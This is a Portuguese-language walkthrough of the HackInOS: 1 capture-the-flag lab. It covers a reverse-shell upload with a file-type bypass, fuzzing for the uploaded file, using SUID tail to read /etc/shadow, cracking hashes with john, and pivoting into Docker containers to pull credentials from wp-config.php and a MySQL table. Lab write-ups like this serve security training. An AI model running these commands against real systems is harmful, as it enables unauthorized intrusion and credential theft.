---
layout: default
---

# HackInOS: 1

[Download:](https://www.vulnhub.com/entry/hackinos-1,295/)


**Name:** HackInOS: 1

**Date release:** 9 Mar 2019

**Description:**

"O HackinOS é uma máquina vulnerável ao estilo CTF de nível iniciante. Criei essa VM para a comunidade de segurança cibernética da minha universidade e para todos os entusiastas da segurança cibernética. Agradeço a Mehmet Oguz Tozkoparan, Ömer Faruk Senyayla e Tufan Gungor por sua ajuda durante a criação deste laboratório." _Author: Fatih Çelik_

**NOTA:** `localhost` está destinado a estar lá!

### Table of Contents

- [Enumeration](#enumeration)
    - [netdiscover](#netdiscover)
    - [nmap](#nmap)
        - [Web Server](#web-server)
- [Find Vulnerabilities](#find-vulnerabilities)
    - [robots.txt](#robots.txt)
- [Exploitation](#exploitation)
    - [Locate php-reverse-shell](#locate-php-reverse-shell)
    - [Listening port](#listening-port)
    - [Upload shell](#upload-shell)
- [Previlege Escalation](#previlege-escalation)
    - [Spawn Shell](#spawn-shell)
    - [Linux PrivEsc](#linux-privesc)
    - [File Transfer](#file-transfer)
- [Post Exploitation](#post-exploitation)
    - [Static Binaries](#static-binaries)
    - [File Sensitive](#file-sensitive)
    - [Discover IP](#discover-ip)
    - [Crack Hash](#crack-hash)
    

### Enumeration

#### netdiscover

Inicialmente vamos usar o `netdiscover` para encontrar o IP da nossa VM, porém essa máquina é possível visualizar o IP facilmente através da VM, mas geralmente isso não é  possível. Então, recomendo usar o netdiscover para se acostumar.

```
netdiscover -i eth0 -r 192.168.111.1/24
```

![netdiscover1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/netdiscover.png)

#### nmap

Como de costume utilizamos o `nmap` em nossa enumeração inicial.

```
nmap -sV -sC -oA nmap/initial 192.168.111.136
```
![nmapinitial](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/nmapinit.png)

Podemos observar 2 portas abertas `8000` e `22`, precisamos escanear todas as portas e verificar se existe um outro serviço em uma porta mais alta.

```
nmap -sV -sT -p1-49152 -oA nmap/allports_tcp 192.168.111.136
```

![allports_tcp](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/allports_tcp.png)

##### Web Server

Possivelmente é um `Wordpress`. O site esta quebrado, vamos ajustar isso...

![wordpress](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/wordpress.png)

Todos os links estavam redirecionando para `localhost`, então editamos nosso hosts `/etc/hosts` e adicionamos o IP da VM  para o localhost: Observe que comentei o padrão do kali.

![localhost1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/localhost.png)

Depois de realizar os ajustes, o site abre perfeitamente:

![site](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/site.png)

### Find Vulnerabilities

#### robots.txt

Enumerando um pouco mais, encontramos o `robots.txt`. Com um file e um dir setados como `Disallow`, vamos navegar ate eles.

![robots](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/robots.png)

Temos um ótimo lugar para fazer o upload de nosso `payload`.

![upload](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/upload.png)

Depois que for feito o upload, podemos localizá lo no dir `/uploads/`.

![uploads](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/uploads.png)

### Exploitation

#### Locate php-reverse-shell

Agora vamos localizar um `shell.php` para facilitar nosso trabalho, poderíamos gerar com o `msfvenom`. Mas automatizar as coisas e ganhar tempo é melhor ainda.

```
locate php-reverse-shell
```

![locate](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/locate.png)

Copie para um diretório de sua escolha:

![copy](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/copy.png)

Edite de acordo com suas configurações.

![edite](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/edite.png)

#### Listening port

```
nc -lvp 1337
```

![listen](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/listen.png)

#### Upload shell

Olhando o source do upload.php, encontramos uma dica que sugere ir até o github através do link passado.

![git](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/git.png)

[Vulnerable-Machine---Hint](https://github.com/fatihhcelik/Vulnerable-Machine---Hint)

O código do upload.php podemos ver, que o arquivo é renomeado para `[nomedoarquivo].php.[numero entre 1-100]`

![code](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/md5.png)

Usando bash podemos fazer isso facilmente, com o seguinte comando:

```
for number in $(seq 1 100); do echo -n "shell.php$number" |md5sum |sed 's/  -/.php/g' >> hashe.txt ;done          
```

![hashmd5](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/hashmd5.png)

Usamos como nome de arquivo `shell.php`, vamos renomear nosso payload para shell.php, adicionando o `GIF89a;` no inicio do arquivo para fazermos o bypass.

![mvphp](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/mvphp.png)

Agora, realizamos o upload novamente.

![shellupload](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/shellupload.png)

Arquivo enviado:

![enviado](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/enviado.png)

Usando o `WFUZZ` vamos fazer um brute e encontrar nosso arquivo em `/uploads/`.

```
wfuzz -c -w hashe.txt --hc 404 http://localhost:8000/uploads/FUZZ
```

![wfuzz](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/wfuzz.png)

A porta `1337` já encontra-se em listening conforme configuramos anteriormente, em seguida acessamos nosso payload em uploads e obtemos uma reverse shell.

![getshell](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/getshell.png)

### Previlege Escalation

#### Spawn Shell

Nossa shell está muito zoada, não podemos apagar que da error. Vamos ajustar e deixar nossa shell good.

```
python -c 'import pty;pty.spawn("/bin/bash")';
Ctrl + Z
stty -echo raw 
fg
```

![spawn](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/spawn.png)

#### Linux PrivEsc

Particulamente eu sempre uso o `LinEnum`, para realizar privesc. Existem outros scripts e recomendo vocês pesquisarem. Um post legal para você iniciar é o _g0tmi1k_ [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[LinEnum download](https://github.com/rebootuser/LinEnum)

#### File Transfer

Em um pentest é comumente necessário a transferência de arquivos, hoje vou usar o modulo webserver do python, existe varias outras formas para transferência de arquivo, talvez pode rolar ate um post explanando sobre.

```
python -m SimpleHTTPserver 80
```

Usando o `curl` em nossa máquina alvo, fazemos o download do Linenum.

```
curl http://192.168.111.128/LinEnum.sh -O LinEnum.sh
```

![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/trasnfer.png)

Mude as permissões do Linenum para que ele seja executado, usando o `chmod +x LinEnum.sh`

![perm](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/perm.png)

Execute o script: `/bin/bash LinEnum.sh`

![execute](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/execute.png)

Olhando o output do script, achamos algo útil que vai ajudar com nosso privilege escalation. O `tail` tem `SUID`, ou seja podemos executar como root e ler o shadow por exemplo.

![suid](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/suid.png)

Veja, com o user `www-data` não temos permissão. Porém o `tail` tem permissão de root com o SUID e ele pode ler o shadow.

![shad](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/shad.png)

Se você ler o manual `tail --help` pode obter mais informações de como usar:

![tail](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/tail.png)

Temos o `hash` do root. Vamos usar o `john` e obter a senha. Salve a hash em um arquivo `.txt`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```

![john](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/john.png)

Game Over:   senha `john`

![flag1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/root1.png)

`Life consists of details..`

Anteriormente eu tinha visto um outro IP, de acordo com minha experiencia trata-se de um docker. Mas agora não resta dúvidas depois da mensagem da flag. Vamos continuar com nossa exploração.

### Post Exploitation

#### Static Binaries

Vamos utilizar o binário estático do nmap para enumerar a rede `172.18.0.0`.

![network](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/network.png)

[static-binaries](https://github.com/andrew-d/static-binaries)

Realizamos a transferência do nmap

![nmaps](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/nmaps.png)

Tentei usar o nmap static para poder scanear a rede, mas não consegui executar o binário. Vamos tentar de outra forma. 

![error](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/error.png)

#### File Sensitive

Navegando ate o `/var/www/html/` encontramos as configurações do wordpress, um arquivo importante é o `wp-config.php`. Creds `wordpress:wordpress`.

![wordpress_cred](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/wordpress_cred.png)

#### Discover IP

Vamos escanear de uma forma mais manual a rede. _Se você não sabe, é proibido usar msfconsole na OSCP._

```
for ip in $(seq 1 20); do ping -c 1 172.18.0.$ip >> ips.txt ;done
```

![ips](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/ips.png)

```
grep "time=" ips.txt
```

![greip](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/greip.png)

Como podemos ver existe 4 ips ativos, o `172.18.0.2` é o nosso,  `172.18.0.1` provavelmente seja GW, então resta `172.18.0.3` e `172.18.0.4`. Vamos agora buscar as portas abertas nesses ips. 

Existe uma probabilidade enorme de ter um banco de dados por conta daquelas creds que encontramos no wordpress, no qual mostra que o serviço se conecta com um banco de dados. Então, vamos testar logo portas comuns. De cara vou tentar portas como `3306`, `1433` na qual são portas de `DataBase`. 

[Common TCP/IP Ports ](https://pentestlab.blog/2012/03/05/common-tcpip-ports/)

```
nc -nv 172.18.0.4 3306
nc -nv 172.18.0.3 3306
```

![opendb](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/opendb.png)

Vamos tentar fazer login com as creds encontradas no `wp-config.php`. 

```
mysql -u wordpress -p wordpress -h 172.18.0.3
```

![db1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/wordpres_access.png)

Conseguimos conectar no mysql, vamos enumerar melhor e ver o que encontramos.

```
show databases;
```

![showdb](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/showdb.png)

```
show tables;
```

![showtables](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/showtables.png)

```
select * from host_ssh_cred ;
```

![hah](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/ccd.png)


#### Crack Hash

Agora com a hash `MD5` obtida, vamos crackeaR  e obter a senha.

```
john --format=RAW-md5 hash_.txt
```

![hashio](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/hashi.png)
[back](../index.md)

**SENHA:** `123456`

Temos agora uma nova credencial ssh `hummingbirdscyber:123456`